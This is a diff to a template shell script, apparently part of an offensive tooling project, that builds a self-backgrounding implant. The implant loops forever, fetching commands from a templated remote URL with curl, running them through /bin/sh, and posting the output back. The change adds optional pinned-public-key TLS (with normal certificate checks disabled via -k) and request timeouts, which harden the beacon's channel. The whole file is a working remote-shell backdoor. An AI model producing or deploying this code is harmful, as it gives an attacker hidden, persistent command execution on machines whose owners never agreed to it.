@@ -3,8 +3,11 @@
      * Template for a cURL in a loop self-backgrounding script.
      * By J. Stuart McMurray
      * Created 20230726
-     * Last Modified 20230807
+     * Last Modified 20231215
      */ -}}
+{{- define "pinnedpubkey" -}}
+	{{ if .PubkeyFP }} -k --pinnedpubkey "sha256//{{ .PubkeyFP }}"{{ end }}
+{{- end -}}
 #!/bin/sh
 
 /bin/sh >/dev/null 2>&1 <<'_eof' &
@@ -13,9 +16,9 @@ ID="{{ .RandN }}-$(hostname || uname -n || curl -s file:///proc/sys/kernel/hostn
 
 while :; do
         (
-                curl -s "{{ .URL }}/t/$ID" |
+                curl {{- template "pinnedpubkey" . }} -s -m 10 "{{ .URL }}/t/$ID" |
                 /bin/sh 2>&1 |
-                curl --data-binary @- -s "{{ .URL }}/o/$ID"
+                curl {{- template "pinnedpubkey" . }} --data-binary @- -s -m 10 "{{ .URL }}/o/$ID"
         ) </dev/null &
         sleep 5
 done
